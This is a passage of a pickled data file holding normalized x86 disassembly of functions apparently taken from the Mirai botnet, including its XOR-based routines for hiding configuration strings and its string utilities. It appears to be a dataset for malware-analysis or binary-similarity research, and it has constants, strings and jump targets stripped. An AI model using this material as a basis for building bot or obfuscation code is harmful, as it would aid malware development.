V~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~EAX,[ESP+0]\nMOV~ECX,[EDI+0]\nLEA~EDX,[EBX+0]\nADD~EAX,ECX\nCMP~EAX,EDX\nJBE~FOO\nCMP~[EBX+0],0\nJZ~FOO\nMOV~AL,[EBX]\nCMP~AL,0\nJNZ~FOO\nMOV~BYTEPTR[EBX],0\nMOV~AL,[ESI]\nCMP~AL,0\nJNZ~FOO\nMOV~BYTEPTR[ESI],0\nMOV~AL,[EBX+0]\nCMP~AL,0\nJNZ~FOO\nMOV~[EBX+0],0\nJMP~FOO\nJZ~FOO\nCMP~EAX,0\nJNZ~FOO\nMOV~EDX,[ESP+0]\nCMP~DWORDPTR[EDX],0\nJZ~FOO\nSUB~ESP,0\nMOV~ESI,[EDI+0]\nPUSH~ESI\nCALL~FOO\nMOV~AL,[EDI+0]\nADD~ESP,0\nINC~EAX\nMOV~[EDI+0],0\nMOV~[EDI+0],AL\nCMP~AL,0\nJBE~FOO\nMOV~[EDI+0],0\nMOV~[EDI+0],0\nJMP~FOO\nMOV~BYTEPTR[ESI],0\nJMP~FOO\nMOV~[EBX+0],0\nJMP~FOO\nMOV~EDX,EAX\nPUSH~EAX\nLEA~EAX,[EDI+0]\nPUSH~0\nPUSH~EAX\nPUSH~EDX\nCALL~FOO\nMOV~EAX,[EDI+0]\nSUB~EAX,0\nADD~ESP,0\nMOV~[EDI+0],EAX\nJMP~FOO\nLEA~EBP,[EAX+0]\nCMP~EBP,0\nJZ~FOO\nTEST~EBP,EBP\nJLE~FOO\nMOV~EDX,[EDI]\nXOR~EAX,EAX\nPUSH~0\nMOV~AL,[EDX+0]\nPUSH~EAX\nMOV~EAX,[EDX]\nPUSH~EAX\nMOV~EAX,[EDI+0]\nPUSH~EAX\nCALL~FOO\nPUSH~0\nPUSH~0\nPUSH~0\nMOV~EAX,[EDI+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~[EDI+0],0\nJMP~FOO\nLEA~EBP,[EAX+0]\nCMP~EBP,0\nJZ~FOO\nTEST~EBP,EBP\nJLE~FOO\nMOV~EDX,[EDI]\nXOR~EAX,EAX\nPUSH~0\nMOV~AL,[EDX+0]\nPUSH~EAX\nMOV~ESI,[EDX+0]\nPUSH~ESI\nMOV~EBX,[EDI+0]\nPUSH~EBX\nCALL~FOO\nPUSH~0\nPUSH~0\nPUSH~0\nMOV~ECX,[EDI+0]\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nMOV~[EDI+0],0\nJMP~FOO\nLEA~EBP,[EAX+0]\nCMP~EBP,0\nJZ~FOO\nTEST~EBP,EBP\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nPUSH~0\nMOV~ESI,[ESP+0]\nPUSH~ESI\nPUSH~EAX\nMOV~EBX,[EDI+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nMOV~ECX,[EDI+0]\nPUSH~ECX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nMOV~[EDI+0],0\nJMP~FOO\nLEA~EBP,[EAX+0]\nCMP~EBP,0\nJZ~FOO\nTEST~EBP,EBP\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~0\nCALL~FOO\nPUSH~0\nMOV~ESI,[ESP+0]\nPUSH~ESI\nPUSH~EAX\nMOV~EBX,[EDI+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nMOV~ECX,[EDI+0]\nPUSH~ECX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nMOV~[EDI+0],0\nJMP~FOO\nLEA~EBP,[EAX+0]\nCMP~EBP,0\nJZ~FOO\nTEST~EBP,EBP\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nPUSH~0\nMOV~ESI,[ESP+0]\nPUSH~ESI\nPUSH~EAX\nMOV~EBX,[EDI+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nMOV~ECX,[EDI+0]\nPUSH~ECX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nMOV~[EDI+0],0\nJMP~FOO\nLEA~EBP,[EAX+0]\nCMP~EBP,0\nJZ~FOO\nTEST~EBP,EBP\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nPUSH~0\nCALL~FOO\nPUSH~0\nMOV~ESI,[ESP+0]\nPUSH~ESI\nPUSH~EAX\nMOV~EBX,[EDI+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nMOV~ECX,[EDI+0]\nPUSH~ECX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nMOV~[EDI+0],0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EAX\nMOV~EAX,[EDI+0]\nPUSH~EAX\nCALL~FOO\nMOV~AL,[EDI+0]\nADD~ESP,0\nINC~EAX\nMOV~[EDI+0],0\nMOV~[EDI+0],AL\nCMP~AL,0\nJNZ~FOO\nOR~EBP,0\nMOV~[EDI+0],0\nMOV~[EDI+0],0\nJMP~FOO\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nADD~EBX,0\nPUSH~EAX\nADD~EBP,0\nMOV~ESI,[EDI+0]\nPUSH~ESI\nCALL~FOO\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nMOV~ECX,[EDI+0]\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nMOV~EDX,[EDI+0]\nJMP~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nMOV~EAX,[EDI+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nOR~EAX,[ESP+0]\nJNZ~FOO\nMOV~[EDI+0],0\nCALL~FOO\nMOV~DX,<STR>\nAND~EDX,0\nMOV~EBX,<STR>\nMOV~ECX,EDX\nXOR~EDX,EDX\nDIV~,ECX\nTEST~EBX,EBX\nJLE~FOO\nMOV~EAX,<STR>\nXOR~ECX,ECX\nJMP~FOO\nINC~ECX\nADD~EAX,0\nCMP~ECX,EBX\nJZ~FOO\nCMP~DX,[EAX+0]\nJB~FOO\nCMP~DX,[EAX+0]\nJNB~FOO\nMOV~ECX,[EDI+0]\nMOV~[EDI],EAX\nMOV~[EDI+0],0\nJMP~FOO\nSUB~ESP,0\nMOV~EAX,[EDI+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~[EDI+0],0\nMOV~[EDI+0],0\nMOV~[EDI+0],0\nJMP~FOO\nMOV~EAX,[EBX+0]\nMOV~EDX,EAX\nAND~EAX,0\nSHR~EDX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,[EBX+0]\nCMP~ESI,EAX\nJGE~FOO\nMOV~ESI,EAX\nJMP~FOO\nSUB~ESP,0\nMOV~EDX,[EBX+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nMOV~[EBX+0],0\nCMP~[EBX+0],0\nJBE~FOO\nMOV~AL,[EBX+0]\nINC~EAX\nMOV~[EBX+0],AL\nCMP~AL,0\nJZ~FOO\nMOV~EAX,EBX\nCALL~FOO\nJMP~FOO\nMOV~EAX,EDI\nOR~EBP,0\nCALL~FOO\nJMP~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nJMP~FOO\nTEST~EDX,EDX\nJZ~FOO\nMOV~CL,0\nJMP~FOO\nXOR~EAX,EAX\nJMP~FOO\nMOV~EAX,[ESP+0]\nMOV~DWORDPTR[EAX],0\nJMP~FOO\nMOV~EAX,EDI\nCALL~FOO\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nMOV~BYTEPTR[EBX],0\nJMP~FOO\nSUB~ESP,0\nMOV~EBX,<STR>\nPUSH~EBX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nINC~EAX\nJZ~FOO\nPUSH~ECX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nINC~EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],EAX\nCALL~FOO\nADD~ESP,0\nMOV~ESI,EAX\nTEST~EAX,EAX\nJZ~FOO\nMOV~[ESP+0],0\nMOV~EBX,[EAX+0]\nCALL~FOO\nXOR~EDX,EDX\nMOV~DL,[ESI]\nMOV~ECX,EDX\nXOR~EDX,EDX\nDIV~,ECX\nMOV~EAX,[EBX+EDX*4]\nMOV~[ESP+0],EAX\nPUSH~EDI\nPUSH~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~AX,[EAX]\nMOV~[ESP],ESI\nMOV~[ESP+0],AX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nLEA~EAX,[ESP+0]\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nMOV~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJNZ~FOO\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EDI\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~[ESP+0],0\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nMOV~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nMOV~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nMOV~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nXOR~EAX,EAX\nPUSH~0\nMOV~EDX,[ESP+0]\nMOV~AL,[EDX+0]\nPUSH~EAX\nMOV~EAX,[EDX]\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nXOR~EAX,EAX\nPUSH~0\nMOV~ECX,[ESP+0]\nMOV~AL,[ECX+0]\nPUSH~EAX\nMOV~EAX,[ECX+0]\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EBP\nJMP~FOO"'
p119
L6164L
tp120
a(S'table_retrieve_val'
p121
S'"MOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nTEST~ECX,ECX\nLEA~EDX,<STR>\nLEA~EAX,[EDX+0]\nJZ~FOO\nMOV~EAX,[EAX+0]\nAND~EAX,0\nMOV~[ECX],EAX\nMOV~EAX,[EDX+0]\nRETN"'
p122
L42L
tp123
a(S'table_lock_val'
p124
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nXOR~EAX,EAX\nMOV~AL,[ESP+0]\nLEA~ECX,<STR>\nMOV~EAX,<STR>\nCMP~[ECX+0],0\nJZ~FOO\nMOV~EDI,EAX\nMOV~ESI,EAX\nMOV~EBP,EAX\nXOR~EDX,EDX\nSHR~EAX,0\nSHR~EDI,0\nMOV~[ESP],AL\nSHR~ESI,0\nMOV~EBX,[ECX]\nMOV~EAX,EDX\nADD~EAX,EBX\nMOV~EBX,EBP\nXOR~[EAX],BL\nMOV~EAX,EDX\nMOV~EBX,[ECX]\nADD~EAX,EBX\nMOV~EBX,EDI\nXOR~[EAX],BL\nMOV~EAX,EDX\nMOV~EBX,[ECX]\nADD~EAX,EBX\nMOV~EBX,ESI\nXOR~[EAX],BL\nMOV~EAX,EDX\nMOV~EBX,[ECX]\nINC~EDX\nADD~EAX,EBX\nMOV~BL,[ESP]\nXOR~[EAX],BL\nMOV~EAX,[ECX+0]\nAND~EAX,0\nCMP~EAX,EDX\nJG~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p125
L114L
tp126
a(S'table_unlock_val'
p127
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nXOR~EAX,EAX\nMOV~AL,[ESP+0]\nLEA~ECX,<STR>\nMOV~EAX,<STR>\nCMP~[ECX+0],0\nJZ~FOO\nMOV~EDI,EAX\nMOV~ESI,EAX\nMOV~EBP,EAX\nXOR~EDX,EDX\nSHR~EAX,0\nSHR~EDI,0\nMOV~[ESP],AL\nSHR~ESI,0\nMOV~EBX,[ECX]\nMOV~EAX,EDX\nADD~EAX,EBX\nMOV~EBX,EBP\nXOR~[EAX],BL\nMOV~EAX,EDX\nMOV~EBX,[ECX]\nADD~EAX,EBX\nMOV~EBX,EDI\nXOR~[EAX],BL\nMOV~EAX,EDX\nMOV~EBX,[ECX]\nADD~EAX,EBX\nMOV~EBX,ESI\nXOR~[EAX],BL\nMOV~EAX,EDX\nMOV~EBX,[ECX]\nINC~EDX\nADD~EAX,EBX\nMOV~BL,[ESP]\nXOR~[EAX],BL\nMOV~EAX,[ECX+0]\nAND~EAX,0\nCMP~EAX,EDX\nJG~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p128
L114L
tp129
a(S'table_init'
p130
S'"PUSH~EBX\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~<STR>,EBX\nMOV~<STR>,0\nADD~ESP,0\nPOP~EBX\nRETN"'
p131
L2254L
tp132
a(S'util_strlen'
p133
S'"MOV~EDX,[ESP+0]\nXOR~EAX,EAX\nCMP~BYTEPTR[EDX],0\nJZ~FOO\nNOP\nLEA~ESI,[ESI+0]\nINC~EAX\nCMP~BYTEPTR[EAX+EDX],0\nJNZ~FOO\nRETN"'
p134
L24L
tp135
a(S'util_strcpy'
p136
S'"PUSH~ESI\nPUSH~EBX\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nCMP~BYTEPTR[EAX],0\nJZ~FOO\nXOR~ESI,ESI\nINC~ESI\nCMP~BYTEPTR[ESI+EAX],0\nJNZ~FOO\nCMP~ESI,0\nJZ~FOO\nMOV~EBX,EDX\nMOV~ECX,EAX\nMOV~EDX,ESI\nMOV~AL,[ECX]\nDEC~EDX\nMOV~[EBX],AL\nINC~ECX\nINC~EBX\nCMP~EDX,0\nJNZ~FOO\nMOV~EAX,ESI\nPOP~EBX\nPOP~ESI\nRETN\nMOV~EBX,EDX\nMOV~ECX,EAX\nXOR~EDX,EDX\nXOR~ESI,ESI\nJMP~FOO"'
p137
L62L
tp138
a(S'util_memcpy'
p139
S'"PUSH~ESI\nPUSH~EBX\nMOV~ECX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~EBX,[ESP+0]\nTEST~ECX,ECX\nJZ~FOO\nXOR~EDX,EDX\nMOV~AL,[EDX+EBX]\nMOV~[EDX+ESI],AL\nINC~EDX\nCMP~EDX,ECX\nJNZ~FOO\nPOP~EBX\nPOP~ESI\nRETN"'
p140
L34L
tp141
a(S'util_zero'
p142
S'"MOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nTEST~EDX,EDX\nJZ~FOO\nXOR~EAX,EAX\nMOV~ESI,ESI\nMOV~BYTEPTR[EAX+ECX],0\nINC~EAX\nCMP~EAX,EDX\nJNZ~FOO\nRETN"'
p143
L26L
tp144
a(S'util_memsearch'
p145
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~EBP,[ESP+0]\nCMP~EDI,ECX\nJLE~FOO\nOR~EAX,0\nPOP~EDX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nTEST~ECX,ECX\nJLE~FOO\nXOR~EBX,EBX\nXOR~ESI,ESI\nMOV~EDX,0\nJMP~FOO\nXOR~ESI,ESI\nINC~EBX\nINC~EDX\nCMP~ECX,EBX\nJZ~FOO\nMOV~EAX,[ESP+0]\nMOV~AL,[EDX+EAX-0]\nCMP~AL,[ESI+EBP]\nJNZ~FOO\nINC~ESI\nCMP~EDI,ESI\nJNZ~FOO\nMOV~EAX,EDX\nJMP~FOO"'
p146
L78L
tp147
a(S'util_atoi'
p148
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nNOP\nLEA~ESI,[ESI+0]\nMOV~CL,[ESI]\nINC~ESI\nMOVSX~EBX,CL\nMOVSX~EAX,BL\nMOV~[ESP],EAX\nCMP~AL,0\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nCMP~CL,0\nJZ~FOO\nMOV~ECX,0\nMOV~[ESP+0],0\nMOV~EAX,ECX\nXOR~EDX,EDX\nDIV~,[ESP+0]\nXOR~EDI,EDI\nXOR~EBP,EBP\nMOV~[ESP+0],EDX\nMOV~[ESP+0],EAX\nJMP~FOO\nLEA~EDX,[EBX-0]\nCMP~EDX,[ESP+0]\nJGE~FOO\nTEST~EDI,EDI\nJS~FOO\nCMP~EBP,[ESP+0]\nJA~FOO\nJZ~FOO\nMOV~EAX,[ESP+0]\nMOV~EDI,0\nIMUL~EAX,EBP\nLEA~EBP,[EAX+EDX]\nMOVSX~EBX,BY